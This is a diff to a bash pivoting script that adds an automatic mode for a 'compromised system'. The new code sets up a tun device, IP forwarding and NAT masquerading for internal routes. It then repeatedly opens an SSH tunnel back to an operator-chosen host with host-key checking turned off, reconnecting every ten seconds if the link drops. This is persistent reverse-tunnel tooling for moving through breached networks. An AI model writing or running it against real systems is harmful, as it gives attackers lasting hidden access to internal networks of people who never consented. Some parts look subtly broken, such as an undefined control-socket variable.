@@ -3,6 +3,8 @@
 # Define color codes
 GREEN='\033[0;32m' # Green
 NC='\033[0m'       # No Color
+auto_username=""
+auto_ip=""
 
 # Function to display the help menu
 show_help() {
@@ -13,6 +15,7 @@ show_help() {
   echo "  -t, --target           Set up the compromised system"
   echo "  -r, --routes [route(s)] Add routes (required with -s or -t)"
   echo "  -i, --interface        Specify the outgoing interface (default: eth0)"
+  echo "  -a, --auto [username] [ipaddress]    Automatically connect using SSH tunnel (only supported using pub/priv key)"
   echo "  --cleanup [source|target]  Remove setup for controlled or compromised system"
   echo ""
   echo "Example usage:"
@@ -20,6 +23,8 @@ show_help() {
   echo "  sudo $0 -r 10.60.1.0/24 -s"
   echo "  To set up the target system with a single route:"
   echo "  sudo $0 -r 10.60.1.0/24 -i enps1 -t"
+  echo "  To set up the target system to automatically connect back (polling system):"
+  echo "  sudo $0 -r routes.txt -i enps1 --auto whitehat 123.123.123.123"
   echo ""
 }
 
@@ -142,6 +147,59 @@ setup_compromised_system() {
   echo -e "${GREEN}ssh -f -N -w 0:1 <user@target>${NC}"
 }
 
+setup_auto_compromised_system() {
+  # Function to check if the SSH tunnel is active
+  check_connection() {
+    ping -c 1 -W 5 10.10.255.2 > /dev/null 2>&1
+  }
+
+  # Implement compromised system setup steps
+  ip tuntap add dev tun0 mode tun user root
+
+  echo "[+] Adding tuntap device tun0 for user root"
+  ip addr add 10.10.255.1/30 dev tun0
+  echo "[+] Adding ip address to tun0"
+  ip link set dev tun0 up
+  echo "[+] Activating tun0"
+  modprobe tun
+  echo "[+] Ran modprobe tun"
+  # Check if IP forwarding is already enabled
+  current_ip_forward_setting=$(sysctl -n net.ipv4.ip_forward)
+  if [ "$current_ip_forward_setting" -eq 0 ]; then
+    sysctl -w net.ipv4.ip_forward=1
+    echo "[+] Enabled IP forwarding"
+  else
+    echo "[!] IP forwarding is already enabled"
+  fi
+  ip route add 10.10.255.2 via 10.10.255.1 dev tun0
+  echo "[+] Added route for 10.10.255.2 via 10.10.255.1 dev tun0"
+  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
+  for route in "${route_array[@]}"; do
+    iptables -t nat -A POSTROUTING -d $route -o $interface -j MASQUERADE
+    echo "[!] Added iptable rule for $route on $interface !"
+  done
+
+  # Create the SSH tunnel initially
+  ssh -o StrictHostKeyChecking=no -f -N -w 0:1 "$auto_username@$auto_ip"
+
+  # Monitor and automatically reconnect if the connection is lost
+  while true; do
+    # Check if the connection is active
+    if ! check_connection; then
+      echo "[!] Connection lost. Reconnecting..."
+      # Close any existing SSH control socket
+      ssh -O exit -S "$CONTROL_SOCKET" > /dev/null 2>&1
+      # Create the SSH tunnel again
+      ssh -o StrictHostKeyChecking=no -f -N -w 0:1 "$auto_username@$auto_ip"
+      echo "[!] SSH tunnel recreated."
+    else
+      echo "[✓] Connection is active."
+    fi
+    # Wait for a few seconds before checking again
+    sleep 10
+  done
+}
+
 cleanup_controlled_system() {
   if [ -n "$routes" ]; then
     # Remove added route
@@ -150,7 +208,7 @@ cleanup_controlled_system() {
   fi
   # Remove TUN/TAP adapter
   ip link del tun1
-  
+
   # Check and remove PermitTunnel setting
   if grep -q "^\s*PermitTunnel yes" /etc/ssh/sshd_config; then
     sed -i '/PermitTunnel yes/d' /etc/ssh/sshd_config
@@ -241,14 +299,27 @@ while [[ $# -gt 0 ]]; do
       setup_controlled_system
       ;;
     -t | --target)
-      target_option=true
       if [ -z "$routes" ] || [ -z "$interface" ]; then
         echo "[-] The -t or --target option requires the -r or --routes option and the -i or --interface option."
         show_help
         exit 1
       fi
-      # Implement compromised system setup steps
-      setup_compromised_system
+      if [ -n "$auto_username" ] && [ -n "$auto_ip" ]; then
+        setup_auto_compromised_system
+      else
+        setup_compromised_system
+      fi
+      ;;
+    -a | --auto)
+      if [ -z "$routes" ] || [ -z "$interface" ]; then
+        echo "[-] Routes, interface, username, ip address are required arguments for --auto."
+        show_help
+        exit 1
+      else
+        auto_username="$2"
+        auto_ip="$3"
+        setup_auto_compromised_system
+      fi
       ;;
     --cleanup)
       if [ -n "$2" ]; then
